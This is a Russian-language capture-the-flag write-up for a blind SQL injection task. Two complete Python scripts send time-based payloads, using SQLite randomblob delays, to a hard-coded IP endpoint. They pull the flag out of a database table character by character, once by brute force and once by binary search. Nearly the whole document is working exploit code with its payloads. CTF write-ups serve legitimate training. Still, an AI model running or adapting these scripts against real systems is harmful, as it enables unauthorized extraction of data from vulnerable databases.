**Задание:**

Флаг находится в первой записи таблицы flag БД. В наличии только уязвимый эндпоинт, который отвечает одним и тем же сообщением на любой запрос.

Адрес api: http://31.207.77.216:4005/check?number=1

---
**Решение:**

Простой перебор по одному символу:

```python
import requests
import time
import string

def blind_sql_injection():
    base_url = "http://31.207.77.216:4005/check"
    result = ""
    
    alphabet = "_{}" + string.ascii_letters + string.digits
    
    # Брутфорсим по одному символу
    position = 1
    while True:
        found_char = False
        
        for char in alphabet:
            print(f"Checking: {char}")
            # Time-based payload: если символ совпадает, выполняется задержка
            payload = f"1 AND (SELECT hex(substr(flag,{position},1)) FROM flag LIMIT 1) = hex('{char}') AND (SELECT randomblob(1000000000))--"
            
            time.sleep(1)
            start_time = time.time()
            
            try:
                response = requests.get(base_url, params={'number': payload}, timeout=10)
                response_time = time.time() - start_time
                print(f"Response time: {response_time}")
                
                # Если ответ пришел дольше 3 секунд - значит задержка сработала
                if response_time >= 2.5:
                    result += char
                    print(f"Found: {result}")
                    found_char = True
                    break
                    
            except requests.exceptions.Timeout:
                # Таймаут = задержка сработала
                result += char
                print(f"Found: {result}")
                found_char = True
                break
                
            except Exception as e:
                print(f"Error: {e}")
                continue
        
        # Если символ не найден, возможно это конец строки
        if not found_char:
            print("No more characters found")
            break
            
        position += 1
    
    return result


if __name__ == "__main__":
    print("Starting search...")
    flag = blind_sql_injection()
    print(f"Final flag: {flag}")
```

Бинарный поиск для оптимизации и ускорения:

```python
import requests
import time

def blind_sql_injection():
    base_url = "http://31.207.77.216:4005/check"
    result = ""
    
    position = 1
    while True:
        low = 32
        high = 126
        
        while low <= high:
            mid = (low + high) // 2
            
            print(f"Position {position}: testing ASCII {mid} ('{chr(mid)}'), range [{low}-{high}]")
            
            # Проверяем, больше ли текущий символ чем mid
            payload = f"1 AND (SELECT substr(flag,{position},1) FROM flag LIMIT 1) >= '{chr(mid)}' AND (SELECT randomblob(1000000000))--"
            
            time.sleep(0.5)
            start_time = time.time()
            
            try:
                response = requests.get(base_url, params={'number': payload}, timeout=8)
                response_time = time.time() - start_time
                
                if response_time >= 2.5:
                    print(f"ASCII >= {mid} - TRUE")
                    low = mid + 1  # символ больше или равен mid, ищем в правой половине
                else:
                    print(f"ASCII >= {mid} - FALSE")
                    high = mid - 1  # символ меньше mid, ищем в левой половине
                    
            except requests.exceptions.Timeout:
                print(f"ASCII >= {mid} - TRUE (timeout)")
                low = mid + 1
                
            except Exception as e:
                print(f"Error: {e}, retrying...")
                time.sleep(2)
                continue
        
        # После завершения цикла low = high + 1
        # Искомый символ равен low - 1 (или high)
        found_ascii_val = low - 1
        
        # Если найденный ASCII-код находится в пределах искомого диапазона (32-126)
        if found_ascii_val >= 32 and found_ascii_val <= 126:
            found_char = chr(found_ascii_val)
            result += found_char
            print(f"Found: '{found_char}' (ASCII {found_ascii_val}), current result: {result}")
            position += 1
        else:
            # Если low - 1 меньше 32, значит символ не был найден в заданном диапазоне
            # или это конец строки
            print("No more characters found")
            break
    
    return result

if __name__ == "__main__":
    print("Starting search...")
    flag = blind_sql_injection()
    print(f"Final flag: {flag}")
```